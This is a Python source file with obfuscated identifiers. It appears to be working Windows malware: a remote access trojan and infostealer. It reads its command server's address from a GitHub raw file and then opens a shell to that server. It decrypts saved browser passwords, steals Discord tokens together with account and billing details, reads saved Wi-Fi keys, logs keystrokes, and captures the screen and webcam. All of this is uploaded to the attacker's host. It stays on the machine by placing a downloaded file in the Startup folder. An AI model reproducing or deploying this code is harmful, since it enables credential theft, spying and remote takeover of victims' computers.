import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil,re
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
ZELAPdzzWQeITeVTxSQdeV = ""
NBaZPZQ = ""
QHZfReroKtHw = "17.01.25.2"
KEYLOGONSTART = True
TRPwgzU = "!"
beNNoLvGQysov = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
xoqhOOsWmxdP = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
QLMmQDxOnpSXfCWCFNRtDyf = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
BCImvBpFIYPHrEjcGs = {
	'chrome':QLMmQDxOnpSXfCWCFNRtDyf+'Google\\Chrome\\User Data','chromium':QLMmQDxOnpSXfCWCFNRtDyf+'Chromium\\User Data','chrome-canary':QLMmQDxOnpSXfCWCFNRtDyf+'Google\\Chrome SxS\\User Data',
	'msedge':QLMmQDxOnpSXfCWCFNRtDyf+'Microsoft\\Edge\\User Data','msedge-canary':QLMmQDxOnpSXfCWCFNRtDyf+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':QLMmQDxOnpSXfCWCFNRtDyf+'Microsoft\\Edge Beta\\User Data','msedge-dev':QLMmQDxOnpSXfCWCFNRtDyf+'Microsoft\\Edge Dev\\User Data',
	'avast':QLMmQDxOnpSXfCWCFNRtDyf+'AVAST Software\\Browser\\User Data','amigo':QLMmQDxOnpSXfCWCFNRtDyf+'Amigo\\User Data',
	'torch':QLMmQDxOnpSXfCWCFNRtDyf+'Torch\\User Data','kometa':QLMmQDxOnpSXfCWCFNRtDyf+'Kometa\\User Data','orbitum':QLMmQDxOnpSXfCWCFNRtDyf+'Orbitum\\User Data',
	'cent-browser':QLMmQDxOnpSXfCWCFNRtDyf+'CentBrowser\\User Data','7star':QLMmQDxOnpSXfCWCFNRtDyf+'7Star\\7Star\\User Data',
	'sputnik':QLMmQDxOnpSXfCWCFNRtDyf+'Sputnik\\Sputnik\\User Data','vivaldi':QLMmQDxOnpSXfCWCFNRtDyf+'Vivaldi\\User Data',
	'epic-privacy-browser':QLMmQDxOnpSXfCWCFNRtDyf+'Epic Privacy Browser\\User Data','uran':QLMmQDxOnpSXfCWCFNRtDyf+'uCozMedia\\Uran\\User Data',
	'yandex':QLMmQDxOnpSXfCWCFNRtDyf+'Yandex\\YandexBrowser\\User Data','brave':QLMmQDxOnpSXfCWCFNRtDyf+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':QLMmQDxOnpSXfCWCFNRtDyf+'Iridium\\User Data','coccoc':QLMmQDxOnpSXfCWCFNRtDyf+'CocCoc\\Browser\\User Data',
	'opera':USER_ROAMING+'Opera Software\\Opera Stable','opera-gx':USER_ROAMING+'Opera Software\\Opera GX Stable'
}
def acjcZxZQJpatxRS(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def amwJhTfq(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	QHZLzVqQhDM = data.decode("utf-8").replace("\n","")
	if not QHZLzVqQhDM.startswith(TRPwgzU):
		proc = subprocess.run(QHZLzVqQhDM, shell=True, capture_output=True)
		hsNgPbFjsPMrXeSmi = proc.stdout + proc.stderr
		s.send(hsNgPbFjsPMrXeSmi)
		return
	UtkcrKPSurs = QHZLzVqQhDM.split(" ")[0][1:]
	args = " ".join(QHZLzVqQhDM.split()[1:]).split()
	if UtkcrKPSurs == "download":
		EogxIfsDyaEZhYXoiJhaK(s, QHZLzVqQhDM)
	elif UtkcrKPSurs == "screenshot":
		uKSBMKDp(s)
	elif UtkcrKPSurs == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif UtkcrKPSurs == "update":
		RDbzeEsWqwBAsLpeAYdeS(s)
	elif UtkcrKPSurs == "wifi":
		gwyNtfvSOeZqIxeDJJd(s)
	elif UtkcrKPSurs == "screenrecord":
		eIrAFkjNobRFYTAzbv(s, args)
	elif UtkcrKPSurs == "browsers":
		gphcFyKfOK(s)
	elif UtkcrKPSurs == "webcam":
		webCam(s, args)
	elif UtkcrKPSurs == "cd":
		try: os.chdir(QHZLzVqQhDM[4:])
		except: pass
def EogxIfsDyaEZhYXoiJhaK(s, QHZLzVqQhDM):
	ESgCmSsvhR = QHZLzVqQhDM.replace(TRPwgzU+"download ","").split(",")
	hsNgPbFjsPMrXeSmis = ""
	for f in ESgCmSsvhR:
		hsNgPbFjsPMrXeSmis += dsQsPTscYlxeKjfVHqH(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(hsNgPbFjsPMrXeSmis, "utf-8"))
def uKSBMKDp(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	ERxZIPwRtFxnjGKFgTXeUL = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(ERxZIPwRtFxnjGKFgTXeUL)
	image.close()
	r = dsQsPTscYlxeKjfVHqH(ERxZIPwRtFxnjGKFgTXeUL, "api/sscap")
	os.remove(ERxZIPwRtFxnjGKFgTXeUL)
	s.send(bytes(r,"utf-8"))
def webCam(s, args):
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(QLMmQDxOnpSXfCWCFNRtDyf+"wc.jpg", camera.get_data(0))
		camera.close()
		r=dsQsPTscYlxeKjfVHqH(QLMmQDxOnpSXfCWCFNRtDyf+"wc.jpg","api/wc")
		s.send(bytes(r,"utf-8"))
	except:
		s.send(bytes("[!] 404\n", "utf-8"))
def eIrAFkjNobRFYTAzbv(s, args):
	VtDgMrixMhAfcG = 15
	if not args == []:
		try: VtDgMrixMhAfcG = int(args[0])
		except: pass
	yANImjHUBuNsFQTJkUh = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	ygRZTYZOQMZoZXFzasyja = []
	fps = 11
	numFrames = VtDgMrixMhAfcG * fps
	for _ in range(numFrames):
		ygRZTYZOQMZoZXFzasyja.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(yANImjHUBuNsFQTJkUh, ygRZTYZOQMZoZXFzasyja, fps=fps, quality=8)
	dsQsPTscYlxeKjfVHqH(yANImjHUBuNsFQTJkUh, "api/screc")
def dsQsPTscYlxeKjfVHqH(HQeWePyPiGPC, rbhUeiCAuL, HkXhoqBERKbWe=None):
	if not os.path.isfile(HQeWePyPiGPC):
		return "[!] 404: "+HQeWePyPiGPC+"\n"
	headers = {"user":os.getlogin()}
	if HkXhoqBERKbWe is not None:
		headers = {**headers, **HkXhoqBERKbWe}
	f = open(HQeWePyPiGPC, "rb")
	requests.post("http://"+ZELAPdzzWQeITeVTxSQdeV+":5555/"+rbhUeiCAuL,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def mAPsWQcpEmZxcpQkCdkA(ELTGFRylyFqOqBaDWBcrR, rbhUeiCAuL):
	if ELTGFRylyFqOqBaDWBcrR.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+ZELAPdzzWQeITeVTxSQdeV+":5555/"+rbhUeiCAuL,
		data=ELTGFRylyFqOqBaDWBcrR,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def RDbzeEsWqwBAsLpeAYdeS(s):
	h, p, v = pbnaLFjJBTrY(True)
	if (v != QHZfReroKtHw):
		YXEUszzRh(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def gwyNtfvSOeZqIxeDJJd(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	daBEQsqKysJcIUoTmUNDQaF = ""
	for p in profiles:
		try: daBEQsqKysJcIUoTmUNDQaF+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: daBEQsqKysJcIUoTmUNDQaF+=f"    {p} - N/A\n"
	s.send(bytes(daBEQsqKysJcIUoTmUNDQaF, "utf-8"))
def YXEUszzRh(PeKDgZAnPkWjLtodxhcXYs):
	mNpfAqyjVOzEYmM = os.path.basename(__file__)
	fileType = mNpfAqyjVOzEYmM.split(".")[-1]
	ENdOHHQaBZiRUYDmyWr = mNpfAqyjVOzEYmM.split(".")[0]+"."+PeKDgZAnPkWjLtodxhcXYs+".pyw" if fileType.startswith("py") else ".exe"
	agrMctSfghjTDQW = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), ENdOHHQaBZiRUYDmyWr)
	if not os.path.isfile(agrMctSfghjTDQW):
		with open(agrMctSfghjTDQW, "w+") as f:
			f.write(requests.get(xoqhOOsWmxdP+"file."+ "pyw" if agrMctSfghjTDQW.split(".")[-1].startswith("py") else "exe").text)
	else:
		KEYLOGONSTART = False
def pbnaLFjJBTrY(force=False):
	global ZELAPdzzWQeITeVTxSQdeV, NBaZPZQ
	if force or ZELAPdzzWQeITeVTxSQdeV == "" or NBaZPZQ == "":
		data = requests.get(beNNoLvGQysov).text.replace("\n","").split(":")
		ZELAPdzzWQeITeVTxSQdeV = data[0].strip()
		NBaZPZQ = data[1].strip()
		PeKDgZAnPkWjLtodxhcXYs = data[2].strip()
	return ZELAPdzzWQeITeVTxSQdeV, NBaZPZQ, PeKDgZAnPkWjLtodxhcXYs
def srXRzjhvkEVShClZVBgdp():
	try:
		trUoffVZJkx = "settings.xpb"
		sqZOjNoGTttHj = sorted([file for file in os.listdir(QLMmQDxOnpSXfCWCFNRtDyf) if os.path.isfile(QLMmQDxOnpSXfCWCFNRtDyf+"\\"+file) and file.endswith(trUoffVZJkx.split(".")[-1])])
		if trUoffVZJkx in sqZOjNoGTttHj:
			sqZOjNoGTttHj.remove(trUoffVZJkx)
		wNAFliqdHxaM = os.path.join(QLMmQDxOnpSXfCWCFNRtDyf,trUoffVZJkx)
		if len(sqZOjNoGTttHj) > 0:
			with open(wNAFliqdHxaM, "ab+") as f:
				for file in sqZOjNoGTttHj:
					temp = os.path.join(QLMmQDxOnpSXfCWCFNRtDyf,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		dsQsPTscYlxeKjfVHqH(wNAFliqdHxaM, "api/log")
		if os.path.isfile(wNAFliqdHxaM):
			os.remove(wNAFliqdHxaM)
	except:
		pass
def ghNwqWaHpIuA():
	logging.basicConfig(filename=(QLMmQDxOnpSXfCWCFNRtDyf+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def vTzXpjaeMcRlNFpisAx(k):
		logging.info(str(k))
	k=Listener(on_press=vTzXpjaeMcRlNFpisAx)
	VXrckKQeIvFGLpQvPEx = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in VXrckKQeIvFGLpQvPEx:
		l.setLevel(logging.CRITICAL)
	k.start()
def gphcFyKfOK(s, upload=False):
        MPtxHKULDOZuNyZmfIYl = "\n"
        for browser in BCImvBpFIYPHrEjcGs:
                path = BCImvBpFIYPHrEjcGs[browser]
                KveTrpRLInBLxBPVR = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        KveTrpRLInBLxBPVR = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", QLMmQDxOnpSXfCWCFNRtDyf+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(QLMmQDxOnpSXfCWCFNRtDyf+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        MPtxHKULDOZuNyZmfIYl += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(KveTrpRLInBLxBPVR, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                MPtxHKULDOZuNyZmfIYl += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(QLMmQDxOnpSXfCWCFNRtDyf+"\\db.db")
        mvrtXel = []
        discordPaths = [USER_ROAMING+'\\discord\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordcanary\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                KveTrpRLInBLxBPVR = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        KveTrpRLInBLxBPVR = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(KveTrpRLInBLxBPVR, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in mvrtXel:
                                                mvrtXel.append(decryptedToken)
        TsqXyaaCkkOoGZwzqu = "https://discord.com/api/v9/users/@me"
        if mvrtXel: MPtxHKULDOZuNyZmfIYl +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for eoEOFbxTkeCCjCkQkxhyV in mvrtXel:
                headers = {"Content-Type":"application/json","Authorization":eoEOFbxTkeCCjCkQkxhyV,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(TsqXyaaCkkOoGZwzqu, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(TsqXyaaCkkOoGZwzqu+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(TsqXyaaCkkOoGZwzqu+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                MPtxHKULDOZuNyZmfIYl += f"\n{user}\n{'-'*len(user)}\nToken: {eoEOFbxTkeCCjCkQkxhyV}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        MPtxHKULDOZuNyZmfIYl += "\n"
        if not upload:
                s.send(bytes(MPtxHKULDOZuNyZmfIYl,"utf-8"))
        else:
                mAPsWQcpEmZxcpQkCdkA(MPtxHKULDOZuNyZmfIYl, "api/google")
def eaKSyZnkERrjJRVCgpZ():
	h, p, v = pbnaLFjJBTrY()
	try:
		srXRzjhvkEVShClZVBgdp()
		gphcFyKfOK(None,True)
		if QHZfReroKtHw != v:
			YXEUszzRh(v)
		if KEYLOGONSTART:
			ghNwqWaHpIuA()
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	QUlaDGOiJ = ("(old)"if QHZfReroKtHw!=v else "")+"["+QHZfReroKtHw+"] "+os.getlogin()+" - "
	while True:
		assQYbKIRttQUSwejuOMLrw=False
		try:
			s=acjcZxZQJpatxRS(h, p)
			while not assQYbKIRttQUSwejuOMLrw:
				s.send(bytes(QUlaDGOiJ+os.getcwd().replace("\\","/")+ "/ >> ", "utf-8"))
				assQYbKIRttQUSwejuOMLrw=amwJhTfq(s)
			s.close()
		except:
			pass
		time.sleep(5)
eaKSyZnkERrjJRVCgpZ()
